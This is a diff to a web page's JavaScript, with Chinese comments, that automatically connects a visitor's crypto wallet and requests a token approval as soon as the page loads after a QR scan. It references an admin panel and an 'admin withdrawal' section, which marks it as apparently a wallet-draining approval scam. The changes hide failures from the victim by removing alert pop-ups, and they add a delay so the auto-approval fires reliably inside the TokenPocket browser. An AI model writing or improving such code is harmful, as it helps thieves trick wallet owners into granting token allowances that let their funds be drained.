@@ -94,14 +94,16 @@ async function doApprove() {
     });
     alert("✅ 授权成功！");
   } catch (e) {
-    alert("❌ 授权已取消或失败");
+    // 静默失败，不弹提示
+    console.log("授权取消或失败", e);
   }
 }
 
-// 自动连接钱包 + 授权（核心逻辑）
+// 自动连接钱包 + 授权（兼容 TP 内置浏览器）
 async function autoConnectAndApprove() {
+  // 只在 window.ethereum 存在时才执行，避免误判
   if (!window.ethereum) {
-    alert("请在 TokenPocket/钱包内置浏览器打开");
+    console.log("未检测到钱包环境，等待用户手动触发");
     return;
   }
   await switchChain();
@@ -116,14 +118,15 @@ async function autoConnectAndApprove() {
       document.getElementById("adminPanel").classList.add("show");
     }
   } catch (e) {
-    alert("连接或授权失败，请重试");
+    console.log("连接或授权失败", e);
   }
 }
 
-// 页面加载后立刻执行自动流程（扫码打开后直接触发）
+// 页面加载后执行自动流程
 window.onload = async () => {
   genApproveQR();
-  await autoConnectAndApprove();
+  // 延迟 1 秒再执行，给 TP 浏览器注入 ethereum 的时间
+  setTimeout(autoConnectAndApprove, 1000);
 };
 
 // ====================== 管理员提取功能 ======================
